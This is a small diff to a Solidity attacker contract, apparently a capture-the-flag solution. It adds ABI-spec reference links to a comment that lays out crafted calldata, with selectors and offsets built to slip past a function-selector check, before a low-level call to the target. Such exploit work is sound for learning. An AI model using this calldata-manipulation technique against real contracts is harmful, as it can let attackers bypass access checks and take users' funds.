@@ -21,6 +21,7 @@ contract SwitchAttacker {
         );
 
         /*
+
         the shape of the data will be like this:
 
         0x30c13ade
@@ -29,6 +30,9 @@ contract SwitchAttacker {
         20606e1500000000000000000000000000000000000000000000000000000000
         0000000000000000000000000000000000000000000000000000000000000020
         76227e1200000000000000000000000000000000000000000000000000000000
+
+        more about this here: https://medium.com/@libertylocked/what-are-abi-encoding-functions-in-solidity-0-4-24-c1a90b5ddce8
+        https://docs.soliditylang.org/en/v0.8.6/abi-spec.html
         */
 
         (bool success, ) = address(target).call(data);
